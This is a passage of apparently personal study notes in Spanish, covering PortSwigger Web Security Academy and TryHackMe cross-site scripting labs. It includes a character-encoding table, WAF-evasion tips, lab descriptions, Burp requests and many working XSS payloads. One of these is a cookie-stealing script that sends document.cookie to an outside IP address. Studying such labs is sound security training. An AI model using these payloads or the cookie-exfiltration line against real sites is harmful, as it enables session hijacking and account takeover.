# XSS

Esta hoja de trucos de secuencias de comandos entre sitios (XSS) contiene muchos vectores que pueden ayudarle a evitar WAF y filtros. Puede seleccionar vectores por evento, etiqueta o navegador y se incluye una prueba de concepto para cada vector.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet





https://github.com/s0md3v/AwesomeXSS




https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


### Awesome Encoding

|HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|URL|
|----|----|-------|-----------|----|--------|----------|---|
|`&quot;`|"|`&#34;`|quotation mark|u+0022|\0022|\42|%22|
|`&num;`|#|`&#35;`|number sign|u+0023|\0023|\43|%23|
|`&dollar;`|$|`&#36;`|dollar sign|u+0024|\0024|\44|%24|
|`&percnt;`|%|`&#37;`|percent sign|u+0025|\0025|\45|%25|
|`&amp;`|&|`&#38;`|ampersand|u+0026|\0026|\46|%26|
|`&apos;`|'|`&#39;`|apostrophe|u+0027|\0027|\47|%27|
|`&lpar;`|(|`&#40;`|left parenthesis|u+0028|\0028|\50|%28|
|`&rpar;`|)|`&#41;`|right parenthesis|u+0029|\0029|\51|%29|
|`&ast;`|*|`&#42;`|asterisk|u+002A|\002a|\52|%2A|
|`&plus;`|+|`&#43;`|plus sign|u+002B|\002b|\53|%2B|
|`&comma;`|,|`&#44;`|comma|u+002C|\002c|\54|%2C|
|`&minus;`|-|`&#45;`|hyphen-minus|u+002D|\002d|\55|%2D|
|`&period;`|.|`&#46;`|full stop; period|u+002E|\002e|\56|%2E|
|`&sol;`|/|`&#47;`|solidus; slash|u+002F|\002f|\57|%2F|
|`&colon;`|:|`&#58;`|colon|u+003A|\003a|\72|%3A|
|`&semi;`|;|`&#59;`|semicolon|u+003B|\003b|\73|%3B|
|`&lt;`|<|`&#60;`|less-than|u+003C|\003c|\74|%3C|
|`&equals;`|=|`&#61;`|equals|u+003D|\003d|\75|%3D|
|`&gt;`|>|`&#62;`|greater-than sign|u+003E|\003e|\76|%3E|
|`&quest;`|?|`&#63;`|question mark|u+003F|\003f|\77|%3F|
|`&commat;`|@|`&#64;`|at sign; commercial at|u+0040|\0040|\100|%40|
|`&lsqb;`|\[|`&#91;`|left square bracket|u+005B|\005b|\133|%5B|
|`&bsol;`|&bsol;|`&#92;`|backslash|u+005C|\005c|\134|%5C|
|`&rsqb;`|]|`&#93;`|right square bracket|u+005D|\005d|\135|%5D|
|`&Hat;`|^|`&#94;`|circumflex accent|u+005E|\005e|\136|%5E|
|`&lowbar;`|_|`&#95;`|low line|u+005F|\005f|\137|%5F|
|`&grave;`|\`|`&#96;`|grave accent|u+0060|\0060|\u0060|%60|
|`&lcub;`|{|`&#123;`|left curly bracket|u+007b|\007b|\173|%7b|
|`&verbar;`|\||`&#124;`|vertical bar|u+007c|\007c|\174|%7c|
|`&rcub;`|}|`&#125;`|right curly bracket|u+007d|\007d|\175|%7d|



### Awesome Tips & Tricks
- `http(s)://` can be shortened to `//` or `/\\` or `\\`.
- `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
- alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
- You can use `//` to close a tag instead of `>`.
- I have found that `confirm` is the least detected pop-up function so stop using `alert`.
- Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
- The shortest HTML context XSS payload is `<script src=//14.rs>` (19 chars)




</br>


# XSS reflejado en HTML sin codificación

## Laboratorio: XSS reflejado en contexto HTML sin nada codificado

Este laboratorio contiene una vulnerabilidad simple reflejada de secuencias de comandos entre sitios en la funcionalidad de búsqueda.

To solve the lab, perform a cross-site scripting attack that calls the alert functio


En esta clase damos los primeros pasos en el mundo del Cross-Site Scripting (XSS), concretamente en su variante reflejada. Analizamos una funcionalidad de búsqueda donde el valor introducido por el usuario se refleja directamente en la respuesta HTML de la página, sin ningún tipo de codificación o validación.

Aprovechamos esta falta de protección para inyectar código que se ejecuta en el navegador de la víctima al interactuar con la funcionalidad vulnerable. En este caso, demostramos la ejecución de un fragmento de código que invoca una alerta en pantalla, lo cual confirma que la inyección es posible y activa.

Esta lección marca el inicio de una nueva sección dedicada a la explotación de XSS, explorando cómo los datos del usuario, si no son tratados correctamente, pueden convertirse en vectores de ataque dentro del navegador.


Laboratorio: XSS reflejado en contexto HTML sin nada codificado

Este laboratorio contiene una vulnerabilidad simple reflejada de secuencias de comandos entre sitios en la funcionalidad de búsqueda.



<script>onerror=alert;throw 1</script>

<script>{onerror=alert}throw 1</script>











# XSS almacenado en HTML sin codificación

En esta clase abordamos un XSS almacenado, una variante más peligrosa que el reflejado, ya que el código malicioso no se ejecuta solo al enviar una petición directa, sino que queda guardado en el sistema y se activa cada vez que otro usuario accede al contenido afectado.

La vulnerabilidad se encuentra en la funcionalidad de comentarios de una entrada de blog. El sistema acepta entradas de texto —como nombre, email, sitio web y comentario— sin realizar ninguna codificación, validación o filtrado. Esto permite inyectar código que se guarda en el servidor y se ejecuta automáticamente cuando la página del blog vuelve a ser cargada por cualquier visitante.

En esta clase demostramos cómo insertar un fragmento de código que, al visualizarse en el blog, desencadena una acción en el navegador como mostrar una alerta, confirmando que el entorno es vulnerable.

Este laboratorio sienta las bases para comprender cómo el XSS almacenado puede ser utilizado para comprometer a múltiples usuarios, incluso sin interacción directa entre atacante y víctima.

## Laboratorio: XSS almacenado en contexto HTML sin nada codificado

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios almacenada en la funcionalidad de comentarios.

Para resolver este laboratorio, envíe un comentario que llame al alert función cuando se visualiza la publicación del blog.


<script>onerror=alert;throw 1</script>









# XSS DOM con ‘document.write’ y ‘location.search’

En esta lección nos adentramos en el XSS basado en DOM, donde la vulnerabilidad no reside en el servidor, sino en cómo el código JavaScript del navegador procesa los datos de la URL.

El laboratorio utiliza una función que escribe directamente en la página el valor obtenido desde la parte de búsqueda de la URL (lo que va después del símbolo de interrogación). Este dato no es validado ni codificado, y se inserta dinámicamente mediante una función que genera HTML de forma directa.

Inicialmente observamos que al hacer una búsqueda cualquiera, el valor se refleja dentro de un atributo de imagen. A partir de ahí, construimos un vector de ataque que rompe el atributo e introduce código que se ejecuta en el navegador de la víctima.

Este tipo de XSS es especialmente común en aplicaciones ricas en JavaScript y demuestra cómo la lógica del lado cliente puede ser tan peligrosa como una mala validación en el backend.

## Laboratorio: DOM XSS en document.write hundir usando la fuente location.search

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la funcionalidad de seguimiento de consultas de búsqueda. Utiliza JavaScript document.write función que escribe datos en la página. El document.write La función se llama con datos de location.search, que puedes controlar utilizando la URL del sitio web.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert función.



<script> document.write(sanitizeHtml('<iframe onload=alert(1)>'))</script>


"><script>alert('THM')</script>

<script>alert('THM');</script>
</textarea><script>alert('THM');</script>


';alert('THM');//


Original Payload:
<sscriptcript>alert('THM');</sscriptcript>

Text to be removed (by the filter):
<sscriptcript>alert('THM');</sscriptcript>

Final Payload (after passing the filter):
<script>alert('THM');</script>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e


</textarea><script>fetch('http://10.10.17.68:9001?cookie=' + btoa(document.cookie) );</script>






# XSS DOM con ‘innerHTML’ y ‘location.search’
En esta clase seguimos trabajando con XSS basado en DOM, esta vez enfocado en el uso inseguro de la propiedad que modifica directamente el contenido HTML de un elemento del DOM.

La aplicación vulnerable toma el valor introducido en la búsqueda (extraído directamente desde la URL) y lo inserta dentro del contenido de una etiqueta mediante una asignación directa sin aplicar ninguna medida de sanitización. Esto permite introducir fragmentos de código que se interpretan como HTML y que pueden incluir eventos maliciosos.

En este caso, se utiliza una imagen con una ruta inválida que provoca un error al cargar. Ese error activa un manejador de eventos que ejecuta el código malicioso, confirmando que la vulnerabilidad es explotable.

Esta lección refuerza el concepto de que, incluso sin interacción con el servidor, es posible comprometer a los usuarios si se procesan datos no confiables del lado cliente.

## Laboratorio: DOM XSS en innerHTML hundir usando la fuente location.search
APRENDIZ

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la funcionalidad del blog de búsqueda. Utiliza un innerHTML asignación, que cambia el contenido HTML de un div elemento, utilizando datos de location.search.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert función.


<script>
function doSearchQuery(query) {
document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
doSearchQuery(query);
}
</script>

**Respuesta**

<img src=x onerror=alert('XSS')>






# XSS DOM en ‘href’ con jQuery y ‘location.search’
En esta lección continuamos explorando vulnerabilidades de XSS basado en DOM, centrando la atención en el uso de bibliotecas como jQuery y cómo pueden convertirse en vectores de ataque si se manipulan de forma insegura.

La aplicación vulnera al utilizar jQuery para localizar un enlace de navegación y modificar su destino utilizando directamente el valor de un parámetro en la URL. Al no realizarse ningún tipo de validación ni restricción sobre ese valor, es posible reemplazar el destino original con un esquema especial que ejecute código malicioso.

En este caso, sustituimos el valor del parámetro con una instrucción que, al hacer clic en el enlace, ejecuta una función para mostrar las cookies del navegador, demostrando así la explotación exitosa de la vulnerabilidad.

Este ejemplo evidencia cómo incluso operaciones aparentemente inofensivas, como cambiar el destino de un enlace, pueden volverse peligrosas si se basan en datos controlables por el usuario y se usan sin filtros adecuados.

 
 ## Laboratorio: DOM XSS en el ancla jQuery href sumidero de atributos usando location.search fuente
APRENDIZ

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la página de envío de comentarios. Utiliza la biblioteca jQuery $ función selectora para encontrar un elemento de anclaje y cambia su href atributo que utiliza datos de location.search.

Para resolver este laboratorio, realice la alerta de enlace "atrás" document.cookie.


web-security-academy.net/feedback?returnPath=/test


javascript:alert(document.cookie)



web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)





# XSS DOM con jQuery y evento ‘hashchange’
En esta clase trabajamos con una vulnerabilidad de XSS basado en DOM que se dispara cuando el navegador detecta un cambio en la parte del hash de la URL —es decir, todo lo que viene después del símbolo de almohadilla.

La aplicación utiliza jQuery para seleccionar elementos basándose en ese valor y realizar acciones como hacer scroll automático a un post específico. El problema es que se emplea directamente como selector, sin validación alguna, permitiendo al atacante manipularlo para inyectar y ejecutar código en el navegador de la víctima.

Montamos un ataque usando un servidor de explotación que carga la página vulnerable dentro de un contenedor invisible. Al modificarse dinámicamente la URL interna, se inyecta una instrucción que se ejecuta automáticamente mediante un evento de error, invocando una función del navegador como demostración.

Esta clase muestra cómo incluso fragmentos aparentemente inofensivos de la URL, como el hash, pueden ser vectores de ataque si no se gestionan correctamente en el lado cliente.



## Laboratorio: DOM XSS en el receptor del selector jQuery mediante un evento hashchange
APRENDIZ

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la página de inicio. Utiliza jQuery $() función selectora para desplazarse automáticamente a una publicación determinada, cuyo título se pasa a través de location.hash propiedad.

Para resolver el laboratorio, entregue un exploit a la víctima que llame al print() función en su navegador.

<script>
$(window).on('hashchange', function(){
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView();
});
</script>




#I'm%20A%20Photoshopped%20Girl%20Living%20In%20A%20Photoshopped%20World


<img src=x onerror=alert('XSS')>


<iframe src="https://0ac500f1047104e981fe033d006d00a5.web-security-academy.net/#" onload="this.src +='<img src=0 onerror=alert(0)>' "></iframe>

<iframe src="https://0ac500f1047104e981fe033d006d00a5.web-security-academy.net/#" onload="this.src +='<img src=0 onerror=print()>' "></iframe>








# XSS reflejado en atributo con corchetes codificados
En esta clase trabajamos con un XSS reflejado que no ocurre dentro del cuerpo de una etiqueta HTML, sino dentro de un atributo. La aplicación codifica los signos angulares para evitar que se abran etiquetas directamente, pero permite inyectar contenido dentro de valores entre comillas.

La funcionalidad vulnerable es el buscador del blog. Al introducir un valor en el cuadro de búsqueda, este se refleja dentro de un atributo HTML en la respuesta. Usando herramientas como Burp Suite, interceptamos la petición y comprobamos que nuestro valor aparece entre comillas dentro de ese atributo.

La estrategia consiste en cerrar el valor actual del atributo e introducir uno nuevo que contenga un manejador de eventos (por ejemplo, uno que se active al pasar el ratón). Al acceder a la URL modificada y mover el cursor sobre el área afectada, se ejecuta el código inyectado, demostrando que la inyección fue exitosa.

Este laboratorio destaca la importancia de validar correctamente no solo el contenido de las etiquetas, sino también lo que va dentro de atributos, donde también es posible ejecutar código si no se sanitiza correctamente.


## Laboratorio: XSS reflejado en un atributo con corchetes angulares codificados en HTML
APRENDIZ

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad del blog de búsqueda donde los corchetes angulares están codificados en HTML. Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que inyecte un atributo y llame al alert función.


" onmouseover="alert(0)

0 search results for '" onmouseover="alert(0)'







# XSS almacenado en ‘href’ con comillas codificadas
En esta clase exploramos un XSS almacenado que se produce dentro de un atributo de tipo enlace. La funcionalidad vulnerable es el sistema de comentarios del blog, que permite introducir un nombre, correo y un sitio web. El valor del sitio web se utiliza como destino en un enlace generado automáticamente alrededor del nombre del autor del comentario.

El sistema codifica las comillas dobles, pero no valida ni restringe el contenido del enlace. Esto permite introducir un esquema especial como dirección, el cual no apunta a una página web sino que ejecuta directamente código cuando el usuario hace clic.

Aprovechamos este comportamiento para insertar un valor que desencadena una acción maliciosa cuando alguien interactúa con el nombre del autor. Al tratarse de un XSS almacenado, el código queda persistente en la aplicación y se ejecutará para cualquier visitante que visualice ese comentario.

Este laboratorio muestra cómo vectores aparentemente inofensivos, como un campo de URL opcional, pueden utilizarse para comprometer la seguridad de otros usuarios si no se implementan controles adecuados.

## Laboratorio: XSS almacenado en el ancla href atributo con comillas dobles codificado en HTML
APRENDIZ

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios almacenada en la funcionalidad de comentarios. Para resolver este laboratorio, envíe un comentario que llame al alert función cuando se hace clic en el nombre del autor del comentario.



Name:    test
Email:   test@tes.com
Website: javascript:alert(document.cookie)

Website: javascript:alert(0)






# XSS reflejado en string JS con corchetes codificados
En esta clase trabajamos con un XSS reflejado que ocurre dentro de una cadena de texto en un fragmento de código JavaScript. Aunque los signos de apertura y cierre de etiquetas están codificados, el contexto vulnerable no está en HTML, sino en el propio lenguaje JavaScript.

La funcionalidad afectada es el sistema de seguimiento de búsquedas. Al introducir una consulta, el valor se refleja en una variable JavaScript como parte de una cadena. Esto permite al atacante cerrar esa cadena con comillas o caracteres especiales, insertar código adicional, y continuar la ejecución sin generar errores de sintaxis.

Utilizamos este enfoque para romper la cadena original y ejecutar una función maliciosa, demostrando así que la inyección es posible a pesar del filtrado parcial.

Este laboratorio introduce uno de los contextos más comunes y peligrosos en los que puede explotarse XSS: dentro del propio código del cliente, donde las medidas tradicionales de filtrado HTML no son suficientes para evitar el ataque.

 ## Laboratorio: XSS reflejado en una cadena JavaScript con corchetes angulares codificados en HTML
APRENDIZ

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios reflejada en la funcionalidad de seguimiento de consultas de búsqueda donde se codifican corchetes angulares. La reflexión se produce dentro de una cadena de JavaScript. Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que se salga de la cadena JavaScript y llame al alert función.


testing'; alert(0); var pp='probando


<script>
var searchTerms = 'testing'; alert(0); var pp='probando';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>








# XSS DOM con ‘document.write’ dentro de ‘select’
En esta clase abordamos un XSS basado en DOM donde el código vulnerable utiliza una función que genera contenido HTML directamente en la página, tomando los datos desde la parte de búsqueda de la URL, específicamente desde el parámetro que indica el identificador de una tienda.

El fragmento dinámico se inserta dentro de una lista desplegable, por lo que cualquier valor enviado mediante ese parámetro se convierte en una nueva opción dentro del menú. Este comportamiento no incluye ninguna validación o codificación, lo que nos permite modificar la estructura del HTML de forma intencionada.

Para explotar la vulnerabilidad, rompemos la estructura del menú y añadimos un elemento adicional con un comportamiento malicioso, que se ejecuta automáticamente cuando el navegador intenta procesarlo.

Este laboratorio refuerza el concepto de que, cuando se generan elementos HTML a partir de datos controlables por el usuario, incluso dentro de componentes comunes como listas desplegables, puede abrirse una puerta directa a la ejecución de código si no se filtran correctamente las entradas

## Laboratorio: DOM XSS en document.write hundir usando la fuente location.search dentro de un elemento seleccionado
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la funcionalidad del verificador de stock. Utiliza JavaScript document.write función que escribe datos en la página. El document.write La función se llama con datos de location.search que puedes controlar mediante la URL del sitio web. Los datos están encerrados dentro de un elemento seleccionado.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que salga del elemento seleccionado y llame al alert función.


storeId=London<script>alert('Hacked')</script>


<script>
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
if(stores[i] === store) {
continue;
}
document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
</script>



/product?productId=1&&storeId=Lond


### BURPSUITE   REPITER


GET /product?productId=1&&storeId=Lond<script>alert('Hacked')</script><select+name%3d"storeId"><option+selected></option> HTTP/2
Host: 0a6c0000048a47bae2081efb002e00e0.web-security-academy.net
Cookie: session=Qff7jx9ptBhGhm91NrL6626CmnbWyLuV
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i










# XSS DOM en AngularJS con comillas codificadas
En esta clase nos adentramos en un XSS basado en DOM que aprovecha una característica específica de AngularJS, un popular framework de JavaScript. La vulnerabilidad reside en cómo el sistema procesa expresiones dentro de directivas marcadas con un atributo especial en el HTML.

La funcionalidad afectada es un buscador, cuyo valor introducido se refleja dentro de un nodo HTML que está bajo el control de AngularJS. A pesar de que los signos angulares y las comillas están codificados, Angular permite la ejecución de expresiones mediante doble llave, lo que nos abre una vía alternativa para ejecutar código.

Utilizamos una expresión construida con métodos internos del framework para forzar la ejecución de una función maliciosa, demostrando que la entrada del usuario se evalúa directamente dentro del motor de plantillas.

Este laboratorio destaca cómo los entornos con frameworks modernos pueden presentar vectores de ataque muy diferentes a los clásicos, y cómo conocer las particularidades de cada tecnología es clave para su explotación y protección.



## Laboratorio: DOM XSS en expresión AngularJS con corchetes angulares y comillas dobles codificadas en HTML
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en una expresión AngularJS dentro de la funcionalidad de búsqueda.

AngularJS es una biblioteca JavaScript popular, que escanea el contenido de los nodos HTML que contienen ng-app atributo (también conocido como directiva AngularJS). Cuando se agrega una directiva al código HTML, puede ejecutar expresiones de JavaScript entre llaves dobles. Esta técnica es útil cuando se codifican corchetes angulares.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que ejecute una expresión AngularJS y llame al alert función.



https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.md



{{constructor.constructor('alert(1)')()}}



{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}




# XSS DOM reflejado
En esta clase abordamos un XSS reflejado basado en DOM, donde el servidor refleja datos en una respuesta JSON, y luego una función en el navegador —específicamente una llamada peligrosa— evalúa ese contenido sin validación adecuada.

La funcionalidad vulnerable está en el buscador del sitio. Al realizar una búsqueda, el término ingresado se refleja en un archivo JSON de resultados. Este contenido es posteriormente procesado por un script que usa una función que interpreta dinámicamente texto como si fuera código, abriendo la puerta a una inyección si no se escapan correctamente ciertos caracteres.

Aunque el sistema escapa comillas, no hace lo mismo con otros símbolos clave, como la barra invertida. Esto nos permite construir un valor malicioso que rompe la estructura del objeto y añade una instrucción personalizada, haciendo que se ejecute directamente en el navegador.

Este laboratorio muestra cómo una cadena aparentemente segura puede convertirse en un vector de ejecución de código si se mezcla con funciones peligrosas como la evaluación directa de datos, reforzando la importancia de evitar el uso de estas prácticas en el desarrollo web moderno.


## Laboratorio: DOM XSS reflejado
PRACTICANTE

LAB
No resuelto
Este laboratorio demuestra una vulnerabilidad DOM reflejada. Las vulnerabilidades DOM reflejadas ocurren cuando la aplicación del lado del servidor procesa datos de una solicitud y hace eco de los datos en la respuesta. Luego, un script en la página procesa los datos reflejados de manera insegura y, en última instancia, los escribe en un fregadero peligroso.

Para resolver este laboratorio, cree una inyección que llame al alert() función.

 <script>search('search-results')</script>

/search-results?search=New+Year



"'"; alert(0);  var searchResul=


eval('var searchResultsObj = ' + this.responseText);
displaySearchResults(searchResultsObj);

{"results":[],"searchTerm":"Friend\\"alert(0)}//"}




Friend\"*alert(0)}//






GET /search-results?search=Friend\"*alert(0)}// HTTP/2
Host: 0a36003b048bea02814ce326005c000a.web-security-academy.net
Cookie: session=6re096bbWInEuezW7QZJtCX1zimBwavA
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a36003b048bea02814ce326005c000a.web-security-academy.net/?search=Friends
Accept-Encoding: gzip, deflate, br
Priority: u=1, i





HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 50

{"results":[],"searchTerm":"Friend\\"alert(0)}//"}








# XSS DOM almacenado
En esta clase trabajamos con un XSS almacenado basado en DOM, donde el comentario malicioso se guarda en el servidor, pero es procesado y convertido en código ejecutable directamente en el navegador de quien lo visualiza.

La funcionalidad vulnerable se encuentra en el sistema de comentarios del blog. Para prevenir ataques, el sitio aplica una función de reemplazo que intenta codificar los signos angulares, pero lo hace incorrectamente: solo reemplaza la primera aparición en lugar de todas.

Aprovechamos este fallo insertando un par adicional de signos al principio del comentario. Estos primeros caracteres serán codificados y neutralizados, pero los siguientes no serán tocados, permitiendo que el navegador interprete y ejecute el contenido malicioso cuando se carga la página.

Este laboratorio demuestra cómo una protección mal implementada puede dar una falsa sensación de seguridad, y cómo es posible evadirla con simples técnicas de desbordamiento o saturación de filtros.

## Lab: Stored DOM XSS
PRACTITIONER

LAB
Not solved
Este laboratorio demuestra una vulnerabilidad DOM almacenada en la funcionalidad de comentarios del blog. Para resolver este laboratorio, explote esta vulnerabilidad para llamar al alert() función.





displayComments(comments)

<script>loadComments('/post/comment')</script>


https://0a9200bd0383ec95821011c8002500d3.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js


curl -X GET "https://0a9200bd0383ec95821011c8002500d3.web-security-academy.net/post/comment"



<><img src=x onerror=alert('XSS')>




{"avatar":"","website":"https://test1.com","date":"2025-08-07T19:42:30.706417061Z","body":"<><img src=x onerror=alert('XSS')>\r\n\r\n","author":"test1"}






# XSS reflejado en HTML con etiquetas bloqueadas
En esta clase nos enfrentamos a un entorno con XSS reflejado protegido por un firewall que bloquea la mayoría de etiquetas HTML y atributos comunes. El objetivo es encontrar una combinación que permita ejecutar código sin intervención del usuario, pese a las restricciones impuestas.

La funcionalidad vulnerable es un buscador, donde el valor introducido se refleja directamente en el contenido HTML. Intentos clásicos de inyección son rechazados, por lo que utilizamos una estrategia sistemática con ayuda de Burp Suite.

Con Burp Intruder, realizamos una prueba automatizada enviando distintas etiquetas HTML y atributos, observando cuáles generan respuestas válidas. Detectamos que la etiqueta body y el atributo onresize no son filtrados. A partir de ahí, construimos un vector usando un contenedor invisible que al cargarse activa un evento de cambio de tamaño, el cual ejecuta directamente una función del navegador.

La prueba se completa al entregar el vector a una víctima a través de un servidor de explotación, validando así que la ejecución ocurre sin necesidad de clics o interacción adicional.

Este laboratorio muestra cómo es posible evadir sistemas de defensa si se analizan sus patrones de filtrado y se utilizan vectores alternativos cuidadosamente seleccionados.


## Laboratorio: XSS reflejado en contexto HTML con la mayoría de etiquetas y atributos bloqueados
PRACTICANTE

LAB
No resuelto
Este laboratorio contiene una vulnerabilidad XSS reflejada en la funcionalidad de búsqueda, pero utiliza un firewall de aplicaciones web (WAF) para protegerse contra vectores XSS comunes.

Para resolver el laboratorio, realice un ataque de secuencias de comandos entre sitios que evite el WAF y llame al print() función.

Nota
Su solución no debe requerir ninguna interacción del usuario. Causando manualmente print() Ser llamado en tu propio navegador no resolverá el problema del laboratorio.


21	body	200	194	false	false	3480	
33	custom tags	200	194	false	false	3487	



### PRIMERO validamos que etiqueta html pasa por el WAF lo hacemos con el intruder

Event handlers TAGS HTML

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


### INTRUDER

GET /?search=<$etiqueta$> HTTP/2
Host: 0af6000f0311801bbab39df200230060.web-security-academy.net
Cookie: session=WTW35qTptJVnVBfsIPt3QwxVnnR7LYa6
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af6000f0311801bbab39df200230060.web-security-academy.net/?search=%3Ci
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


### NOS DEVUELVE LA etiqueta body 



### Segundo validamos ahora el metodo que permite lo hacemos con el intruder

Event handlers TAGS HTML

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet




GET /?search=<body $evento$=print()> HTTP/2
Host: 0af6000f0311801bbab39df200230060.web-security-academy.net
Cookie: session=WTW35qTptJVnVBfsIPt3QwxVnnR7LYa6
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af6000f0311801bbab39df200230060.web-security-academy.net/?search=%3Ci
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


### NOS DEVUELVE ESTOS EVENTOS

10	onbeforeinput	200	200	false	false	3502	
14	onbeforetoggle	200	199	false	false	3503	
18	oncancel	200	199	false	false	3497	
24	oncommand	200	199	false	false	3498	
25	oncontentvisibilityautostatechange	200	199	false	false	3523	
26	oncontentvisibilityautostatechange(hidden)	200	199	false	false	3531	
35	ondragexit	200	199	false	false	3499	
48	onformdata	200	199	false	false	3499	
50	ongesturechange	200	199	false	false	3504	
51	ongestureend	200	199	false	false	3501	
52	ongesturestart	200	199	false	false	3503	
74	onpagereveal	200	199	false	false	3501	
76	onpageswap	200	199	false	false	3499	
81	onpointercancel	200	199	false	false	3504	
92	onratechange	200	200	false	false	3501	
95	onresize	200	199	false	false	3497	
97	onscrollend	200	204	false	false	3500	
98	onscrollsnapchange	200	223	false	false	3507	
99	onscrollsnapchanging	200	208	false	false	3509	
101	onsecuritypolicyviolation	200	200	false	false	3514	




<body onresize=print()>



<body onresize=print()>

https://exploit-0aef008c03fd80f1ba149cbe01d600dc.exploit-server.net/



<iframe src="https://0af6000f0311801bbab39df200230060.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'></iframe>








# XSS reflejado con solo etiquetas personalizadas
En esta clase enfrentamos un entorno con XSS reflejado donde la aplicación ha bloqueado por completo todas las etiquetas HTML estándar, permitiendo únicamente etiquetas personalizadas. Este tipo de configuración busca prevenir inyecciones, pero aún puede ser burlada si no se filtran los atributos o eventos correctamente.

